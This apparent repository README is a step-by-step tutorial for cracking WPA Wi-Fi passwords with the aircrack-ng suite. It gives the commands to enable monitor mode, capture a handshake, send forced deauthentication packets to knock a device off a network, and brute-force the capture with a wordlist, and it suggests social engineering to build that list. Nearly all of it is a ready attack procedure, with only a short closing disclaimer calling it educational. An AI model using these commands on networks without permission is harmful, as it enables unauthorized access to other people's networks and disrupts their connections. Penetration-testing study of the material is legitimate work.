# Instruction

## Link YouTube video: https://www.youtube.com/watch?v=jeImlZR2A4w

- [ ] TODO Automated Bash Script to do all the process


### Find your current interface configuration, you should use a Wi-Fi module that have embedded the monitor mode functions.


***Does my WI-FI supports monitor mode?***
---> #https://blog.rottenwifi.com/wifi-monitoring-mode/#Does_My_Wi-fi_Support_Monitor_Mode

run this command to see the available interfaces on your machine

```
$ ifconfig
```

if you want to enable an interface, use this command

```
$ ifconfig {interfaceName} up
```
In case of the video, i use the embedded wlan0 

```
$ ifconfig wlan0 up
```

Use airmon-ng start wlan0 to enable monitor mode on the wireless interface

```
$ airmon-ng start wlan0
```

Once it's enable run the command to monitor all the Wi-Fi signal nearby, ***wlan0*** will become wlan0mon due to the previous command

```
$airodump-ng wlan0mon 
```

Choose a connection that you want to try

***I suggest to use meanwhile all the process a file, in which you save notes during all the process, this will be helpful for the next steps.***

Create a directory, in which you will save the file.cap that will be generated during the dumps.

```
$ mkdir /....
```

Run the command below from the folder previous created to start sniffing the connection. 
The aim is to find a four handshake made by the modem, when a device disconnects himself from the Wi-Fi or request a new authentication or other reason due to the connection standards.
The command to run contains various option.

Below the command and some details regarding it:

```
$ airodump-ng wlan0mon -c 10 --bssid {MAC_ADDRESS} -w ./..{crack.cap}
```

***A brief description of the option:***

```
-c  indicates the channel trasmission of the modem

-bssid  indicates the Basic Service Set Identifier

-w indicates the location to write the files
```

Now we have to wait until a device will request a deauth

Boring? 

There is a command to speed up this waiting, simulating a deauth from one device connected to the current target modem.

```
$ aireplay-ng -0 18 -a {MAC_ADDRESS} -c {MAC_ADDRESS} wlan0mon
```

***A brief description of the option***

```
-0 indicates the number of the deauth tempatives packets 
-a MAC_ADDRESS of the modem
-c MAC_ADDRESS of the device to imperson for the deauth
```

If we are lucky, there will be a line outputted on the logs from the command airdump (running on background).

*** Example ***

```
WPA handshake: {MAC_ADDRESS}
```

Finally, it's time to crack

utilizing the file {name}.cap generated from the airdump command, we run the command

```
aircrack-ng -a2 -b {MAC_ADDRESS} -w {wordListPasswordFile} {name}.cap 
```

***The major difficulty could be guessing the right password, if we use some social engineering we can build a small list of password word to brute force. Moreover, we can go with big files, maybe we will find the password or not (In this case is trivial to chose a complex password, so it will be very, very difficult to hack***




 
## Disclaimer: Hacking without permission is illegal. This repo is strictly educational for learning about cyber-security in the areas of ethical hacking and penetration testing so that we can protect ourselves against the real hackers.
